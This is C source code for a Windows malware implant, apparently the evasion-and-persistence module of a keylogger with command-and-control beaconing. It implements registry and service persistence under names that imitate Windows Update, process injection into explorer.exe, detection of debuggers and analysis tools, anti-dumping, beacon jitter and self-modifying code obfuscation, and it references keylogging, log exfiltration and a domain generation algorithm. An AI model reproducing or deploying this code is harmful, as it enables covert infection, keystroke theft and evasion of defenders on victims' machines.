#include "malware.h"
#include <winsvc.h>  // Service control manager

#pragma comment(lib, "psapi.lib")  // Process Status API

// Execute CPUID instruction
static void cpuid(int cpuInfo[4], int function_id) {
    #if defined(__GNUC__)
    __asm__ volatile (
        "cpuid"
        : "=a"(cpuInfo[0]), "=b"(cpuInfo[1]), "=c"(cpuInfo[2]), "=d"(cpuInfo[3])
        : "a"(function_id)
    );
    #else
    __cpuid(cpuInfo, function_id);
    #endif
}

// Initialise obfuscated string using rotating XOR key
static void initObfString(char* dest, const char* src) {
    char key = XOR_KEY;  // Starting XOR key
    int i;
    
    // Process each character
    for (i = 0; src[i]; i++) {
        dest[i] = src[i] ^ key;  // XOR encrypt
        key = (key >> 1) | ((key & 1) << 7);  // Rotate key
    }
    dest[i] = '\0';  // Null-terminate
}

// Initialise global obfuscated strings
void InitObfuscatedStrings() {
    initObfString(OBF_AGENT, "Windows-Update-Agent");
    initObfString(OBF_COMMAND, "command");
    initObfString(OBF_UPLOAD, "upload");
}

// Decrypt obfuscated string into provided buffer
char* GetObfString(char* buffer, size_t buf_size, const char* obf_str) {
    char key = XOR_KEY;  // Starting XOR key
    int i;
    
    // Process each character
    for (i = 0; obf_str[i] && i < buf_size - 1; i++) {
        buffer[i] = obf_str[i] ^ key;  // XOR decrypt
        key = (key >> 1) | ((key & 1) << 7);  // Rotate key
    }
    buffer[i] = '\0';  // Null-terminate
    
    return buffer;  // Return decrypted string
}

// Install persistence via Run registry key
void InstallPersistence() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);  // Get current executable path
    
    // Open Run registry key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // Set registry value to current executable
        RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, 
                      (BYTE*)path, strlen(path)+1);
        RegCloseKey(hKey);
        printf("[Persistence] Registry key installed\n");
    }
}

// Install persistence as Windows service
void InstallService() {
    // Open service control manager
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        printf("[Service] Failed to open SCM: %d\n", GetLastError());
        return;
    }
    
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);  // Get current executable path
    
    // Create service definition
    SC_HANDLE service = CreateServiceA(
        scm,
        "WinUpdateService",            // Service name
        "Windows Update Service",      // Display name
        SERVICE_ALL_ACCESS,            // Access rights
        SERVICE_WIN32_OWN_PROCESS,     // Service type
        SERVICE_AUTO_START,            // Start automatically
        SERVICE_ERROR_NORMAL,          // Error handling
        path,                          // Binary path
        NULL, NULL, NULL, NULL, NULL   // No dependencies
    );
    
    if (service) {
        printf("[Service] Installed successfully!\n");
        CloseServiceHandle(service);
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            printf("[Service] Already installed\n");
        } else {
            printf("[Service] Failed to create service: %d\n", err);
        }
    }
    CloseServiceHandle(scm);  // Close service manager
}

// Detect analysis tools by process name
void AddAntiAnalysis() {
    // List of analysis tool processes
    const char* processes[] = {
        "ollydbg.exe", "idaq.exe", "idaq64.exe", "wireshark.exe", 
        "procmon.exe", "procmon64.exe", "vboxservice.exe"  // VM service
    };
    
    DWORD pids[1024], cbNeeded;
    // Enumerate running processes
    if (EnumProcesses(pids, sizeof(pids), &cbNeeded)) {
        DWORD cProcesses = cbNeeded / sizeof(DWORD);  // Process count
        for (DWORD i = 0; i < cProcesses; i++) {
            if (pids[i] != 0) {
                // Open process handle
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | 
                                             PROCESS_VM_READ, 
                                             FALSE, pids[i]);
                if (hProcess) {
                    char szProcessName[MAX_PATH];
                    // Get process name
                    if (GetModuleBaseNameA(hProcess, NULL, szProcessName, 
                                         sizeof(szProcessName))) {
                        // Check against analysis tools
                        for (int j = 0; j < sizeof(processes)/sizeof(processes[0]); j++) {
                            if (_stricmp(szProcessName, processes[j]) == 0) {
                                printf("[AntiAnalysis] Bad process detected: %s - exiting!\n", szProcessName);
                                ExitProcess(0);  // Exit immediately
                            }
                        }
                    }
                    CloseHandle(hProcess);
                }
            }
        }
    }
}

// Inject into explorer.exe process
void AddProcessInjection() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);  // Current executable path
    
    STARTUPINFOA si = { sizeof(si) };  // Process startup info
    PROCESS_INFORMATION pi;            // Process info
    
    // Create suspended explorer process
    if (CreateProcessA(NULL, 
                      "explorer.exe",  // Process to inject into
                      NULL, NULL, FALSE, 
                      CREATE_SUSPENDED,  // Start suspended
                      NULL, NULL, &si, &pi)) {
        // Allocate memory in target process
        LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, strlen(path) + 1, 
                                         MEM_COMMIT | MEM_RESERVE, 
                                         PAGE_EXECUTE_READWRITE);
        if (remoteMem) {
            // Write DLL path to target memory
            WriteProcessMemory(pi.hProcess, remoteMem, path, strlen(path) + 1, NULL);
            
            // Create remote thread to load our DLL
            HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, 
                                               (LPTHREAD_START_ROUTINE)GetProcAddress(
                                                   GetModuleHandleA("kernel32.dll"), 
                                                   "LoadLibraryA"), 
                                               remoteMem, 0, NULL);
            if (hThread) {
                WaitForSingleObject(hThread, INFINITE);  // Wait for injection
                CloseHandle(hThread);
            }
            
            ResumeThread(pi.hThread);  // Resume injected process
        }
        // Cleanup handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Anti-debugging techniques
void AddAntiDebugging() {
    // Check for hardware breakpoints
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            ExitProcess(0);  // Debugger detected
        }
    }
    
    // Check for INT3 breakpoint at WinMain
    unsigned char* mainAddr = (unsigned char*)&WinMain;
    if (mainAddr[0] == 0xCC) {  // INT3 instruction
        ExitProcess(0);
    }
    
    // Check hypervisor presence
    int cpuInfo[4];
    cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {  // Hypervisor bit set
        ExitProcess(0);
    }
}

// Prevent memory dumping by zeroing headers
void AddAntiDumping() {
    DWORD oldProtect;
    char* baseAddr = (char*)GetModuleHandle(NULL);  // Module base address
    // Make header writable and zero it
    VirtualProtect(baseAddr, 4096, PAGE_READWRITE, &oldProtect);
    ZeroMemory(baseAddr, 4096);
}

// Add jitter to beacon timing for evasion
void AddNetworkEvasion() {
    DWORD base_interval = BEACON_INTERVAL;
    // Calculate jitter: ±25% variation
    DWORD jitter = (GetTickCount() % (base_interval/2)) - (base_interval/4);
    DWORD original = beacon_interval;
    beacon_interval = base_interval + jitter;  // Apply jitter
    
    printf("[Network] Beacon interval: %dms -> %dms (Jitter: %dms)\n", 
           original, beacon_interval, jitter);
}

// Apply runtime code obfuscation (polymorphism)
#pragma optimize("", off)  // Disable compiler optimizations for this function
void ApplyPolymorphicMask() {
    printf("[Polymorph] Applying code obfuscation...\n");
    
    // List of functions to obfuscate with approximate sizes
    void* functions[] = {
        &StartKeylogger,     // Keylogger initialization function
        &BeaconToC2,         // C2 communication handler
        &HandleCommand,      // Command execution logic
        &ExfiltrateLogs,     // Log upload functionality
        &XORCrypt,           // Core encryption routine
        &RegisterWithC2      // Initial C2 registration
    };
    
    // Human-readable names for logging
    char* names[] = {
        "StartKeylogger", 
        "BeaconToC2", 
        "HandleCommand",
        "ExfiltrateLogs",
        "XORCrypt",
        "RegisterWithC2"
    };
    
    // Approximate sizes of each function in bytes
    // WARNING: Must be accurate to prevent overwriting adjacent functions
    size_t sizes[] = {
        120,   // StartKeylogger
        180,   // BeaconToC2
        100,   // HandleCommand
        90,    // ExfiltrateLogs
        50,    // XORCrypt
        70     // RegisterWithC2
    };
    
    // Critical functions to EXCLUDE from obfuscation:
    // These either require stable execution or would break functionality if modified
    void* exclude_functions[] = {
        &AddProcessInjection,   // Injection requires precise instruction alignment
        &WinMain,               // Entry point - must remain stable for execution
        &GenerateDomain,        // DGA must produce predictable results
        &ApplyPolymorphicMask   // Self-reference to prevent recursion issues
    };
    
    // Generate a random XOR key based on system uptime
    BYTE key = (BYTE)(GetTickCount() % 256);
    printf("[Polymorph] Using XOR key: 0x%02X\n", key);
    
    // Calculate number of functions to process
    int num_funcs = sizeof(functions) / sizeof(functions[0]);
    
    // Iterate through all candidate functions
    for (int i = 0; i < num_funcs; i++) {
        // Check if current function is in exclusion list
        int skip = 0;
        for (int j = 0; j < sizeof(exclude_functions)/sizeof(exclude_functions[0]); j++) {
            if (functions[i] == exclude_functions[j]) {
                printf("[Polymorph] Skipping %s (critical function)\n", names[i]);
                skip = 1;
                break;
            }
        }
        if (skip) continue;
        
        DWORD oldProtect;
        // Change memory protection to allow modification
        if (VirtualProtect(functions[i], sizes[i], PAGE_EXECUTE_READWRITE, &oldProtect)) {
            printf("[Polymorph] Obfuscating %s (%zu bytes)\n", names[i], sizes[i]);
            
            BYTE* code = (BYTE*)functions[i];
            // Iterate through function bytes
            for (size_t j = 0; j < sizes[i]; j++) {
                // Preserve function prologue (first 2 bytes)
                // Prologue typically contains: 0x55 (push ebp), 0x8B (mov ebp, esp)
                // Modifying these would break function calls
                if (j < 2) continue;
                
                // Apply XOR with current key
                code[j] ^= key;
                
                // Rotate key: shift right 3 bits, move LSB to bit 5
                // Creates complex key evolution pattern
                key = (key >> 3) | ((key & 1) << 5);
            }
            // Restore original memory protection
            VirtualProtect(functions[i], sizes[i], oldProtect, &oldProtect);
        } else {
            printf("[Polymorph] Failed to protect %s: %d\n", names[i], GetLastError());
        }
    }
    printf("[Polymorph] Obfuscation complete! Modified %d functions\n", num_funcs);
}
#pragma optimize("", on)  // Restore compiler optimizations


// Obfuscate critical functions and strings in memory
void ObfuscateCriticalFunctions() {
    printf("[MemoryObfusc] Starting critical function obfuscation\n");
    
    // Functions to obfuscate
    PVOID functions[] = {&StartKeylogger, &BeaconToC2, &HandleCommand};
    char* names[] = {"StartKeylogger", "BeaconToC2", "HandleCommand"};
    
    // Obfuscate function pointers
    for (int i = 0; i < sizeof(functions)/sizeof(functions[0]); i++) {
        DWORD oldProtect;
        if (VirtualProtect(functions[i], 4, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            DWORD original = *(DWORD_PTR*)functions[i];
            *(DWORD_PTR*)functions[i] ^= 0xDEADBEEF;  // XOR with magic value
            printf("[MemoryObfusc] Obfuscated %s: 0x%08X -> 0x%08X\n", 
                   names[i], original, *(DWORD_PTR*)functions[i]);
            VirtualProtect(functions[i], 4, oldProtect, &oldProtect);
        } else {
            printf("[MemoryObfusc] Failed to protect %s: %d\n", names[i], GetLastError());
        }
    }
    
    // Strings to obfuscate
    char* strings[] = {OBF_AGENT, OBF_DOMAIN, OBF_COMMAND};
    char* str_names[] = {"OBF_AGENT", "OBF_DOMAIN", "OBF_COMMAND"};
    
    // Obfuscate strings
    for (int i = 0; i < sizeof(strings)/sizeof(strings[0]); i++) {
        char* str = strings[i];
        size_t len = strlen(str);
        printf("[MemoryObfusc] Obfuscating %s: '%.10s...' -> ", str_names[i], str);
        
        // XOR each character
        for (size_t j = 0; j < len; j++) {
            str[j] ^= 0x55;  // XOR with 0x55
        }
        
        printf("'%.10s...'\n", str);
    }
    
    printf("[MemoryObfusc] Obfuscation complete!\n");
}